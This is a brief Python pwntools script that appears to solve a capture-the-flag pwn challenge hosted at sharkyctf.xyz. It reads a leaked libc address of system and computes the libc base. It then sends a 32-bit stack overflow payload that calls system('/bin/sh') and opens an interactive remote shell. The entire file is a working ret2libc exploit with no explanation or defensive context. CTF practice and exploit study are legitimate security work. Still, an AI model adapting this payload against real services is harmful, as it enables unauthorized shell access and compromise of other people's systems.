from pwn import * 
p = remote('sharkyctf.xyz', 20334)
p.recvuntil(':')
system = eval(p.recvline().strip())
lib = ELF('./libc-2.27.so')
libcbase = system - lib.symbols['system']
payload = 0x24 * b'a' + p32(system) + p32(0x0) + p32(libcbase + next(lib.search(b'/bin/sh')))
p.sendline(payload)
p.interactive()
